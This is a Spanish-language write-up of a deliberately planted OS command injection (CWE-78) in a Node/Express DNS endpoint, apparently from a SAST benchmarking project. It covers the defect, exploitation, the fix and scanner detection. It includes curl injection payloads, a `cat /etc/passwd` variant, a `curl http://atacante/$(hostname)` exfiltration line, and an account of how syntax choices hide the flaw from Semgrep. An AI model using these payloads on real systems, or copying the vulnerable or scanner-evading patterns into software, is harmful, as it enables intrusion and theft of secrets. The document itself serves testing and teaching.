# VULN-01 — Inyección de comandos del sistema operativo (CWE-78)

| | |
|---|---|
| **CWE** | [CWE-78](https://cwe.mitre.org/data/definitions/78.html) — OS Command Injection |
| **Severidad** | Crítica |
| **Ubicación** | `backend/src/controllers/diagnosticsController.js` (llamada a `exec`) |
| **Endpoint** | `POST /api/diagnose/dns` |
| **Ruta** | `backend/src/routes/index.js` — registrada sin `validateScanBody`, a propósito |
| **Detección esperada** | CodeQL (`js/command-line-injection`) y Semgrep (`detect-child-process`) |
| **Detección real** | _pendiente — se completa con el resultado del run de CI_ |

---

## 1. El defecto

El endpoint resuelve un dominio invocando la utilidad `nslookup` del sistema. El valor
llega del cuerpo de la petición y se **interpola directo en la cadena** que `exec` entrega
a una shell:

```js
exec(`nslookup ${domain}`, { timeout: EXEC_TIMEOUT_MS }, (error, stdout) => {
```

`child_process.exec` no ejecuta un binario: lanza `/bin/sh -c "<cadena>"`. La shell
interpreta metacaracteres — `;`, `|`, `&&`, `` ` ``, `$(...)` — así que quien controle
`domain` controla lo que ejecuta el servidor, con los privilegios del proceso Node.

Hay dos fallos encadenados, y conviene distinguirlos porque tienen fixes distintos:

1. **No se valida la entrada.** La ruta se registra sin `validateScanBody`, mientras que
   `/api/scan/domain` sí lo usa. El proyecto ya tiene un validador correcto —
   `isDomain()` en `backend/src/utils/validators.js` — que aquí no se aplica.
2. **Se usa una API que pasa por shell.** Aunque hubiera validación, `exec` con
   interpolación es el patrón peligroso. La defensa robusta no depende de acertar el
   filtro.

## 2. Explotación

```bash
curl -X POST http://127.0.0.1:3000/api/diagnose/dns \
  -H 'Content-Type: application/json' \
  -d '{"domain": "example.com; id"}'
```

La shell ejecuta `nslookup example.com` y **después** `id`. Como el controller devuelve
`stdout` en el campo `records`, la salida del comando inyectado **vuelve en la respuesta
HTTP**: no es una inyección a ciegas, es ejecución remota de comandos con lectura directa
del resultado.

Variantes que funcionan igual: `$(whoami)`, `` `cat /etc/passwd` ``, `example.com && curl
http://atacante/$(hostname)` para exfiltrar.

**Impacto:** ejecución remota de código. Con acceso a la shell del contenedor se leen las
API keys de `backend/.env` (AbuseIPDB, VirusTotal, URLhaus), que es exactamente el
escenario que el resto del proyecto se cuidó de evitar.

**Lo que NO es alcanzable, y conviene saberlo:** una web maliciosa no puede explotar esto
por *drive-by* contra alguien que la visite. Un formulario HTML puede enviar un POST sin
preflight sólo con `text/plain`, y `express.json()` no parsea ese content-type — `req.body`
queda indefinido y la petición muere en el 400. Con `application/json` sí hay preflight, y
la whitelist de CORS lo rechaza. Es la diferencia entre "endpoint vulnerable en mi máquina"
y "cualquier página que visite me ejecuta comandos". El atacante necesita poder hablar
directo con la API.

## 3. El fix correcto

```js
import { execFile } from 'node:child_process';
import { isDomain } from '../utils/validators.js';

if (!isDomain(domain)) {
  return res.status(400).json({ error: { code: 'INVALID_DOMAIN', message: '…' } });
}

execFile('nslookup', [domain], { timeout: EXEC_TIMEOUT_MS }, (error, stdout) => { … });
```

Dos cambios, en orden de importancia:

1. **`execFile` en vez de `exec`.** Recibe el binario y sus argumentos por separado y no
   invoca una shell, así que `;` o `$(...)` llegan a `nslookup` como texto literal — un
   nombre de dominio inválido, no un comando.
2. **Validar con `isDomain()`**, igual que hacen los endpoints de scan. Defensa en
   profundidad: reduce la superficie aunque la capa de abajo ya sea segura.

Mejor todavía para este caso concreto: `dns.promises.resolve()` de la librería estándar
resuelve DNS sin procesos externos. La regla general es que si existe una API nativa, no
hay motivo para llamar a un binario del sistema.

## 4. Detección: la forma de escribirla decide si se ve

Esta es la lección más importante de VULN-01, y salió de auditarla antes de pushearla.

**La primera versión de este código no la habría detectado nadie.** Estaba escrita como
`import { exec } from 'node:child_process'` con llamada `exec(...)` — la forma moderna e
idiomática. La vulnerabilidad era idéntica y perfectamente explotable, pero:

- El `detect-child-process` que trae `p/javascript` es la variante **de AWS Lambda**: sus
  *sources* son `exports.handler`, así que **nunca dispara sobre Express**.
- El `generic_os_command_exec` de `p/nodejsscan` exige `require('child_process')` de
  **CommonJS**, imposible en este backend (`"type": "module"`).
- La regla correcta, `javascript.lang.security.detect-child-process`, **no venía en ninguno
  de los seis packs configurados** y hubo que añadirla suelta al pipeline.
- Esa regla, además, solo reconoce la llamada en **forma de miembro** (`childProcess.exec`)
  con import de namespace o default, y fija el especificador al literal `'child_process'`:
  el prefijo `node:` la desactiva.

De ahí las dos decisiones deliberadas del controller, ambas comentadas en el código:
`import * as childProcess from 'child_process'` y `function resolveDns(req, res)` como
declaración (el taint de Semgrep toma como origen los *parámetros* de una función, no los
métodos abreviados de un objeto literal).

**Ese es el hallazgo, y vale más que la detección en sí:** dos vulnerabilidades idénticas en
comportamiento se detectan o no según detalles de sintaxis que no tienen ninguna relación
con el riesgo. Un SAST no razona sobre semántica; empareja patrones.

Predicción para este código:

- **CodeQL** — `js/command-line-injection` sigue un flujo de taint desde una fuente remota
  (`req.body`) hasta el sink de ejecución. El flujo es directo, sin saltos: el caso de mayor
  precisión de esa consulta. Es el detector más fiable de los dos.
- **Semgrep** — `detect-child-process`, ya añadida al pipeline, con severidad `ERROR`
  (bloqueante).

Si alguno **no** dispara, hay tres explicaciones posibles y conviene no confundirlas: un
problema del pipeline, un problema de cómo está escrita la vulnerabilidad (lo más frecuente,
como demostró esta auditoría), o un límite genuino del escáner. Ese tercer caso es un
resultado publicable, no un fracaso.

> Nota sobre el conteo: con `security-extended`, CodeQL puede sumar
> `js/unsafe-shell-command-construction` a `js/command-line-injection` sobre la misma línea.
> No son dos vulnerabilidades: es VULN-01 vista por dos consultas.

## 5. Tests

`backend/tests/integration/diagnostics.test.js` afirma el comportamiento **vulnerable**
(que `;` y `$(...)` llegan intactos a la shell) con `node:child_process` mockeado en todo
el archivo. Demuestran la inyección inspeccionando el comando que *se habría* ejecutado,
sin lanzar ningún proceso.

Si esos tests fallan alguna vez, no hay que relajar la aserción: significa que alguien
corrigió VULN-01, y entonces corresponde retirarla del inventario y borrar ese bloque.

## 6. Alcance

La vulnerabilidad está contenida en un controller y una ruta nuevos. No toca el flujo de
`/api/scan/*`, ni los servicios de fuentes, ni el frontend — que ni siquiera consume este
endpoint. El resto de la línea base sigue limpio.
